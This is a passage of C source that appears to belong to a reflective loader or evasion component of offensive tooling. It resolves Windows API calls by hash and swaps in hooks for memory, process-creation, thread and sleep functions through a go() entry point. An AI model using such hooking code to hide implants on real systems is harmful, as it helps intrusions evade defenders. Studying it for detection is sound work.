        return (char *)_CloseHandle;
    }
    else if (h == CREATEFILEMAPPINGA_HASH) {
        return (char *)_CreateFileMappingA;
    }
    else if (h == MAPVIEWOFFILE_HASH) {
        return (char *)_MapViewOfFile;
    }
    else if (h == UNMAPVIEWOFFILE_HASH) {
        return (char *)_UnmapViewOfFile;
    }
    else if (h == VIRTUALQUERY_HASH) {
        return (char *)_VirtualQuery;
    }
    else if (h == DUPLICATEHANDLE_HASH) {
        return (char *)_DuplicateHandle;
    }
    else if (h == READPROCESSMEMORY_HASH) {
        return (char *)_ReadProcessMemory;
    }
    else if (h == WRITEPROCESSMEMORY_HASH) {
        return (char *)_WriteProcessMemory;
    }
    else if (h == EXITTHREAD_HASH) {
        g_ExitThread = result;
        return (char *)_ExitThread;
    }
    else if (h == CREATEPROCESSA_HASH) {
        return (char *)_CreateProcessA;
    }
    else if (h == SLEEP_HASH) {
        return (char *)_Sleep;
    }

    return result;
}

void go(IMPORTFUNCS * funcs, MEMORY_LAYOUT * layout)
{
    funcs->LoadLibraryA   = (__typeof__(LoadLibraryA)   *)_LoadLibraryA;
    funcs->GetProcAddress = (__typeof__(GetProcAddress) *)_GetProcAddress;

    if (layout != NULL) {
        g_layout = *layout;
    }

    initFrameInfo();
}
